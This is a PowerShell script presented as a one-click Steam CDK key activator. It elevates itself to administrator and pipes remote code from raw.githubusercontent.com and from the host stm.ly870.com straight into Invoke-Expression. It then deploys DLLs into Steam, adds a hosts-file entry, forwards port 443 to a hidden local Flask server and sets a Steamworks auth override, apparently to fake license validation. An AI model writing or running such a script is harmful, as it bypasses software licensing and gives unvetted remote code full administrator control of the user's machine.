# Steam CDK Activate - One Click Install
# Kill Steam -> Set env -> Deploy -> Start

if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"irm https://raw.githubusercontent.com/mnb556/steam-cdk/master/install_online.ps1 | iex`""
    exit
}

$repo = "https://raw.githubusercontent.com/mnb556/steam-cdk/master"
$workDir = "$env:LOCALAPPDATA\SteamCDK"

Write-Host "=== Steam CDK Activate ===" -ForegroundColor Cyan

Write-Host "[1/6] Stopping Steam..."
Get-Process | Where-Object { $_.ProcessName -ieq "steam" } | Stop-Process -Force -ErrorAction SilentlyContinue
Start-Sleep 3

Write-Host "[2/6] Setting environment..."
[Environment]::SetEnvironmentVariable("STEAMWORKS_FORCE_AUTH","1","User")
$env:STEAMWORKS_FORCE_AUTH = "1"

Write-Host "[3/6] Deploying VapourTool DLLs..."
Invoke-RestMethod stm.ly870.com | Invoke-Expression

Write-Host "[4/6] Downloading CDK server..."
Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue
New-Item -ItemType Directory -Path $workDir -Force | Out-Null
New-Item -ItemType Directory -Path "$workDir\server\templates" -Force | Out-Null
Invoke-WebRequest "$repo/server/app.py" -OutFile "$workDir\server\app.py" -UseBasicParsing
Invoke-WebRequest "$repo/server/templates/index.html" -OutFile "$workDir\server\templates\index.html" -UseBasicParsing
Invoke-WebRequest "$repo/server/templates/login.html" -OutFile "$workDir\server\templates\login.html" -UseBasicParsing

Write-Host "[5/6] Hosts + Port Forwarding..."
$hostsPath = "$env:SystemRoot\System32\drivers\etc\hosts"
if (-not (Select-String -Path $hostsPath -Pattern "aaaa.ly870.com" -SimpleMatch -ErrorAction SilentlyContinue)) {
    Add-Content -Path $hostsPath -Value "127.0.0.1 aaaa.ly870.com" -Force
}
netsh interface portproxy delete v4tov4 listenport=443 listenaddress=0.0.0.0 2>$null
netsh interface portproxy add v4tov4 listenport=443 listenaddress=0.0.0.0 connectport=8443 connectaddress=127.0.0.1 2>$null

Write-Host "[6/6] Python + Flask + Steam..."
if (!(Get-Command python -ErrorAction SilentlyContinue)) {
    Invoke-WebRequest "https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe" -OutFile "$env:TEMP\py.exe" -UseBasicParsing
    Start-Process "$env:TEMP\py.exe" -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -Wait
    $env:Path = [Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [Environment]::GetEnvironmentVariable("Path","User")
}
python -m pip install flask pyopenssl -q 2>$null

# HTTPS for CDK validation (port 8443 -> netsh 443)
Start-Process python -ArgumentList "-c `"from app import app; app.run(host='127.0.0.1', port=8443, ssl_context='adhoc')`"" -WorkingDirectory "$workDir\server" -WindowStyle Hidden
# HTTP for admin panel (port 5000)
Start-Process python -ArgumentList "$workDir\server\app.py" -WorkingDirectory "$workDir\server" -WindowStyle Hidden
Start-Sleep 3

# Start Steam
$steamPath = (Get-ItemProperty "HKCU:\Software\Valve\Steam" -Name SteamPath -ErrorAction SilentlyContinue).SteamPath
if (!$steamPath) { $steamPath = Split-Path (Get-ItemProperty "HKCU:\Software\Valve\Steam" -Name SteamExe -ErrorAction Stop).SteamExe }
Start-Process (Join-Path $steamPath "Steam.exe")

Write-Host "[OK] Steam started. Enter CDK to activate." -ForegroundColor Green
